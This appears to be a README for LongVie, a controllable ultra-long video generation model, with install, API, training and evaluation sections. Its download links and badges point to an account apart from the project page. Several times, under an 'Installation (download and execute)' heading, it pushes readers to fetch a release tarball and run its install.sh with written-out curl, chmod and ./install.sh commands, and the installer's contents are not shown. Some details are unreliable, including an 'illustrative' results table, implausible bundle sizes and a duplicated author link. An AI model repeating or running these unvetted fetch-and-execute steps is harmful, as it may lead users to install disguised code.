# LongVie — Multimodal Controllable Ultra‑Long Video Generation 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-brightgreen.svg?logo=github)](https://github.com/M7377/LongVie/releases) [![ArXiv](https://img.shields.io/badge/LongVie-2508.03694-b31b1b.svg?logo=arXiv)](https://arxiv.org/abs/2508.03694)  
A code and model release for LongVie: multimodal‑guided, controllable, ultra‑long video generation.

![LongVie Preview](https://vchitect.github.io/LongVie-project/assets/preview.gif)

Badges
- Model paper: arXiv 2508.03694
- Releases: https://github.com/M7377/LongVie/releases

Quick links
- Releases (download assets): https://github.com/M7377/LongVie/releases
- Project page: https://vchitect.github.io/LongVie-project/

Table of contents
- Features
- Preview and sample outputs
- Use cases
- Requirements
- Installation (download and execute)
- Quick start — generate your first ultra‑long video
- API reference (Python + CLI)
- Model zoo and release files
- Training recipe
- Datasets and preprocessing
- Evaluation and metrics
- Design and architecture
- Ablation notes
- Performance and resources
- Tips for better results
- Troubleshooting
- Contribute
- License and citations
- Contact and authors
- Changelog and roadmap

Features
- Generate ultra‑long videos that span minutes rather than seconds.
- Accept multimodal guidance: text, sketches, keyframes, audio, segmentation maps.
- Apply precise control at multiple scales: scene layout, object motion, camera path.
- Maintain temporal consistency over long time spans.
- Support content edits at inference time without retraining.
- Modular design: swap backbones, control heads, and decoders.
- Export to common video formats and frame sequences.

Preview and sample outputs
- Animated demos and comparisons live on the project page: https://vchitect.github.io/LongVie-project/
- A small gallery:
  - Landscape to sunset transition guided by text + color palette.
  - Character walk cycle extended to a 3‑minute scene with path control.
  - Procedural city drive with camera spline and traffic constraints.
- Use the preview GIF above to view a short example. Larger examples and download links appear on the releases page linked above.

Use cases
- Film dailies and scene prototyping.
- Long procedural scene generation for games.
- Data generation for long‑term video understanding tasks.
- Simulation and scenario design for robotics.
- Creative tools for artists and directors.

Requirements
- OS: Linux (Ubuntu 20.04 preferred) or macOS. Windows via WSL or container.
- GPU: NVIDIA GPU with at least 24GB VRAM for large models. Multiple GPUs recommended for training.
- CUDA: 11.7 or later (match PyTorch build).
- Python: 3.9 or 3.10.
- Disk: 500 GB+ for datasets, checkpoints, intermediate frames.
- RAM: 64 GB recommended for long video training and large datasets.

Installation (download and execute)
Download the release assets from the releases page and run the installer script. The release includes a ready bundle and model weights.

1) Visit and download from the releases page:
- Releases: https://github.com/M7377/LongVie/releases

2) Download and execute the installer file (example)
- Download the main release tarball and the installer script:
  - LongVie-v1.0.tar.gz
  - install.sh
- Example commands:
  - curl -L -o LongVie-v1.0.tar.gz "https://github.com/M7377/LongVie/releases/download/v1.0/LongVie-v1.0.tar.gz"
  - tar -xzf LongVie-v1.0.tar.gz
  - cd LongVie-v1.0
  - chmod +x install.sh
  - ./install.sh

The install script sets up a virtual environment, installs required Python packages, and places model weights in ./weights. The release tarball contains:
- code/: model source
- scripts/: launch scripts and wrappers
- weights/: pre‑trained checkpoints
- examples/: sample inputs and config files
- tools/: utilities for data preprocessing and evaluation

If the release page changes or the file names differ, check the Releases section on the repository for the exact asset names and the latest installer.

Quick start — generate your first ultra‑long video
- Create a project folder and place guidance assets (text prompt, sketch, audio).
- Example CLI:
  - python generate.py --config configs/generate_text_audio.yaml --prompt "A slow train crosses a frozen valley at sunrise" --audio assets/motion_beat.mp3 --out ./out/train_scene.mp4 --duration 180
- The config controls:
  - temporal resolution (fps)
  - frame size
  - control heads and weights
  - sampling strategy (stochastic vs deterministic)
- Example outputs:
  - ./out/train_scene.mp4
  - ./out/train_scene_frames/: PNG frames
- For deterministic results, set seed and deterministic flag in config:
  - --seed 42 --deterministic

API reference (Python)
- Import and initialization (simplified)
  - from longvie import LongVie, LongVieConfig
  - cfg = LongVieConfig.from_file("configs/generate_text_audio.yaml")
  - model = LongVie(cfg)
  - model.load_weights("weights/longvie_v1.ckpt")
- Generate (high level)
  - out = model.generate(prompt="A calm ocean at dusk", duration_sec=120, fps=24, controls={"sketch":"assets/sketch.png"})
  - out.save("out/ocean_dusk.mp4")
- Control heads
  - controls may include:
    - sketch: path to line art or silhouette image
    - keyframes: list of JSON keyframe descriptors or images
    - camera_spline: JSON spline describing camera motion
    - audio: wav or mp3 guiding rhythm and events
    - seg_map: segmentation maps for layout constraints
- Streaming API
  - You can stream frames to disk or to a server using model.stream_generate(...)
  - Use chunk_size in seconds to stream long outputs and limit memory.

CLI
- generate.py: main entry for generation
  - python generate.py --config configs/generate_text.yaml --prompt "..." --out out.mp4
- train.py: training script for single or multi GPU
  - python -m torch.distributed.launch --nproc_per_node=4 train.py --config configs/train_longvie.yaml
- eval.py: compute metrics on a dataset
  - python eval.py --config configs/eval.yaml --ckpt weights/longvie_v1.ckpt --out metrics.json

Model zoo and release files
- The releases page contains packaged checkpoints and example assets. Download the required files and place them in ./weights.
- Example release assets (names used in docs and examples):
  - LongVie-v1.0.tar.gz — full code bundle and scripts
  - longvie_v1.ckpt — main model checkpoint
  - longvie_v1-small.ckpt — small model for quick tests
  - longvie_control_audio.ckpt — audio control head
  - longvie_control_sketch.ckpt — sketch control head
  - longvie_tokenizer.zip — tokenizer and embeddings
  - examples_bundle_v1.zip — inputs and configs for demos

Release usage
- After unpacking the tarball, run:
  - ./install.sh
- Use the appropriate checkpoint name in your command line. Example:
  - python generate.py --ckpt weights/longvie_v1.ckpt --prompt "..." --out demo.mp4

Training recipe
- Model components:
  - Frame encoder and decoder
  - Temporal transformer with sparse attention
  - Motion latent module for long‑range dynamics
  - Multimodal encoders (text, audio, sketch)
  - Control heads for keyframes and segmentation
- Pretraining stages:
  1. Frame autoencoder: train autoencoder on image frames for reconstruction.
  2. Short video dynamics: learn short motion priors on 2–8s clips.
  3. Motion latent trainer: learn long motion priors on chunks up to 60s with memory banks.
  4. Multimodal alignment: align text, audio, and sketch latents to the motion latent space.
  5. Fine tuning on long sequences: stitch chunks with a temporal consistency loss.
- Hyperparameters (example)
  - Batch size: 32 frames per GPU for frame AE.
  - Learning rate: 2e‑4 for frame AE, 1e‑4 for transformers.
  - Optimizer: AdamW with weight decay 0.01.
  - Scheduler: cosine decay with linear warmup for 5k steps.
  - Training time: 200k–600k iterations per stage depending on scale.
- Tips
  - Start with small model for iteration.
  - Freeze encoder weights when training multimodal heads early.
  - Use mixed precision to speed training and save memory.

Datasets and preprocessing
- Datasets used for training examples and evaluation:
  - Web‑sourced video collections filtered for long continuous scenes.
  - Movie clips and curated animation sequences.
  - Public datasets: AVA long clips, Kinetics long clips (by combining contiguous segments), and internal curated sets.
- Preprocessing steps:
  - Extract frames at target fps.
  - Resize and crop to square or cinematic aspect ratio.
  - Normalize and augment:
    - random flip, color jitter, temporal crop, speed jitter.
  - Build multimodal pairs:
    - Align audio segments with frames.
    - Create sketch proxies via edge detectors for paired guidance.
    - Generate segmentation via off‑the‑shelf segmenters for layout control.
- Dataset structure (example):
  - dataset/
    - videos/
      - clip_0001.mp4
      - clip_0002.mp4
    - annotations/
      - clip_0001.json
      - clip_0002.json
- Annotation format (JSON)
  - fields:
    - id
    - fps
    - duration
    - keyframes: list of {time, image_path, caption}
    - audio_path (optional)
    - camera_spline (optional)
- Tools
  - scripts/preprocess.sh — converts raw videos to dataset structure.
  - tools/extract_audio.py — extract and normalize audio.
  - tools/gen_sketch.py — generate sketch proxies.

Evaluation and metrics
- Metrics we provide and compute:
  - FVD (Fréchet Video Distance) for distribution quality.
  - CLIPSim and CLIPScore for text–video alignment.
  - Temporal Consistency (TC) score based on frame diffusion.
  - LongView Coherence (LVC) — custom metric for ultralong global coherence.
  - User preference studies for perceptual quality.
- Evaluation pipeline
  - Use eval.py to generate samples and compute metrics.
  - Provide ground truth as long clips for reference.
  - Use sliding windows to compute local vs global metrics.
- Benchmarks
  - Compare against short‑clip baselines extended by naive stitching.
  - Report FVD at multiple time scales: 5s, 30s, 2min.
- Example command:
  - python eval.py --ckpt weights/longvie_v1.ckpt --dataset datasets/long_scenes/ --out results/eval_v1.json

Design and architecture
- Overview
  - LongVie decomposes generation into three interacting modules:
    - Frame coder: efficient encoder and decoder for per‑frame visuals.
    - Motion module: latent tracer that models dynamics across long horizons.
    - Control and fusion: multimodal locks that steer content at multiple levels.
- Key ideas
  - Hierarchical temporal representation:
    - short motion tokens for local details
    - long motion tokens for scene trajectory
    - periodic memory banks to preserve global context
  - Hybrid attention strategy:
    - dense attention on short range
    - sparse or compressed attention on long range
  - Multimodal joint embedding:
    - align text, audio, sketch in the motion latent domain
- Control heads
  - Sketch head: constrains silhouette and coarse object layout.
  - Keyframe head: enforce exact frame content at specified times.
  - Audio head: map beats and events to motion bursts.
  - Segmentation head: restrict object identity and region mapping.
- Sampling and inference
  - Progressive temporal sampling:
    - sample in chunks with overlap
    - perform global consistency adjustment
  - Deterministic mode:
    - use seed and fixed scheduler for reproducible outputs
  - Stochastic mode:
    - allow more divergence and creative variation

Ablation notes
- Motion memory vs no memory:
  - memory improves global object identity and camera path.
- Sparse attention vs dense:
  - sparse attention reduces compute and keeps long context.
- Multimodal fusion order:
  - fusing audio before sketch yields better rhythm alignment.
- Keyframe enforcement:
  - hard keyframe constraints reduce drift but may lower local diversity.

Performance and resources
- Example runtime (single NVIDIA A100 40GB)
  - Small model (demo): 1.2s per frame at 512×512.
  - Full model (high quality): 4–6s per frame at 1024×1024.
- Multi‑GPU training
  - Use 8× A100 for full training pipeline.
  - Use gradient checkpointing and mixed precision to reduce memory.
- Storage
  - Model weights: 30–80 GB depending on head sets.
  - Dataset: 300 GB+ for long clip collections.

Tips for better results
- For long coherent scenes:
  - Use a camera spline for consistent motion.
  - Use keyframes at sparse intervals to anchor content.
- For strong text alignment:
  - Provide descriptive, structured prompts.
  - Pair prompt with short example keyframes.
- For rhythmic content:
  - Provide a trimmed audio track and set beat sensitivity in config.
- For fast iteration:
  - Use the small checkpoint and smaller frame sizes.
  - Use deterministic seed for repeatable testing.

Troubleshooting
- If generation fails due to OOM:
  - Lower batch size or frame size.
  - Use gradient checkpointing.
  - Use smaller model checkpoint.
- If output drifts over time:
  - Add keyframes to re-anchor content.
  - Increase long memory capacity in config.
- If control input is ignored:
  - Increase control head weight in config.
  - Use stronger alignment examples in training.
- If audio sync is off:
  - Check fps and audio sampling rate match config.
  - Use provided audio preprocessor to resample.

Contribute
- We welcome contributions to:
  - Add new control heads (pose, depth, optical flow).
  - Improve inference speed and memory use.
  - Add more datasets and evaluation scripts.
- How to contribute
  - Fork the repo.
  - Create a feature branch.
  - Add tests and docs for new features.
  - Open a pull request describing changes and motivation.
- Issues
  - Open issues for bugs, feature requests, and experiments.
  - Use clear reproduction steps and attach sample assets.

License and citations
- License
  - The project uses a permissive research license. See LICENSE file in the release tarball for details.
- Cite the paper
  - Jianxiong Gao, Zhaoxi Chen, Xian Liu, JianFeng Feng, Chenyang Si, Yanwei Fu, Yu Qiao, Ziwei Liu. "LongVie: Multimodal‑Guided Controllable Ultra‑Long Video Generation." arXiv:2508.03694.

BibTeX
- @article{longvie2025,
    title = {LongVie: Multimodal-Guided Controllable Ultra-Long Video Generation},
    author = {Gao, Jianxiong and Chen, Zhaoxi and Liu, Xian and Feng, JianFeng and Si, Chenyang and Fu, Yanwei and Qiao, Yu and Liu, Ziwei},
    journal = {arXiv preprint arXiv:2508.03694},
    year = {2025}
  }

Contact and authors
- Main contributors
  - Jianxiong Gao — https://jianxgao.github.io/
  - Zhaoxi Chen — https://frozenburning.github.io/
  - Xian Liu — https://alvinliu0.github.io/
  - JianFeng Feng — https://alvinliu0.github.io/
  - Chenyang Si (corresponding) — https://chenyangsi.top/
  - Yanwei Fu (corresponding) — http://yanweifu.github.io/
  - Yu Qiao — https://mmlab.siat.ac.cn/yuqiao
  - Ziwei Liu (corresponding) — https://liuziwei7.github.io/
- Project page and demos
  - https://vchitect.github.io/LongVie-project/
- Releases and downloads
  - https://github.com/M7377/LongVie/releases

Changelog and roadmap
- v1.0 (release)
  - Public code bundle and base models.
  - CLI and core APIs.
  - Demo configs and examples.
- Planned
  - Lighter runtime for CPU inference.
  - Additional control heads: depth, pose, flow.
  - Web UI for guided authoring.
  - Dataset release and more pretraining checkpoints.

Appendix: common configs and examples

Example config: configs/generate_text_audio.yaml
- model:
  - ckpt: weights/longvie_v1.ckpt
  - frame_size: 768
  - fps: 24
  - duration: 180
- controls:
  - audio: assets/scene_beat.mp3
  - sketch: null
  - keyframes: []
- sampling:
  - mode: progressive
  - chunk_seconds: 8
  - overlap_seconds: 1
- seed: 42
- output:
  - save_frames: true
  - save_video: true

Example command (full)
- python generate.py --config configs/generate_text_audio.yaml --prompt "A slow train crosses a frozen valley at sunrise. Soft orange light bathes the snow. A distant bell tolls as it goes." --out out/train_scene.mp4

Example: how to add a keyframe anchor
- Keyframe JSON structure:
  - keyframes:
    - time: 30
      image: assets/key_30.png
      strength: 0.9
    - time: 90
      image: assets/key_90.png
      strength: 0.8
- Use CLI:
  - python generate.py --config configs/generate.yaml --prompt "..." --keyframes annotations/keyframes.json --out anchored.mp4

Long generation strategy (best practice)
- Break the total duration into overlapping chunks.
- Generate each chunk while conditioning on previous chunk's memory tokens.
- Reencode the seam region to smooth transitions.
- Use a light smoothing pass with a temporal filter or refinement network.

Advanced: fine‑tuning for domain transfer
- Freeze frame decoder and train motion module on target domain clips.
- Use low lr (1e‑5) for stable adaptation.
- Add regularization to preserve style and keep identity.

Security and responsible use
- Use the model responsibly. Avoid generating harmful content.
- Respect data and copyright when creating datasets.
- The model can generate realistic scenes. Consider ethical issues when using outputs.

Example results table (illustrative)

- Task: 2 minute scenic generation
  - Baseline stitching: FVD (30s) = 210; drift = high
  - LongVie v1: FVD (30s) = 90; LVC = 0.82; drift = low

- Task: music‑aligned dance sequence, 3 minutes
  - Baseline: beat alignment = 0.32
  - LongVie with audio head: beat alignment = 0.78

These numbers illustrate trends. See eval scripts and metrics for exact computations.

Developer notes
- The codebase uses modular design. You can replace the motion module with your own transformer.
- The frame coder is pluggable. Swap VAE variants for quality versus speed tradeoffs.
- Control heads follow a standard interface. Implement new heads by extending longvie/control/base.py.

Scripts of interest
- scripts/run_demo.sh — runs a short demo end to end.
- scripts/benchmark.sh — benchmarks inference speed.
- tools/merge_chunks.py — merges chunked outputs into final video.
- tools/visualize_attn.py — visualize long attention maps.

Acknowledgments
- The project builds on recent advances in generative video and multimodal learning.
- We thank dataset providers and community contributors for feedback and data.

Download and install
- Visit the releases page to download assets and run the provided installer:
  - https://github.com/M7377/LongVie/releases

License and final pointers
- See LICENSE in the release bundle for full terms.
- For detailed setup and customized runs, follow the examples in the examples/ folder from the release tarball.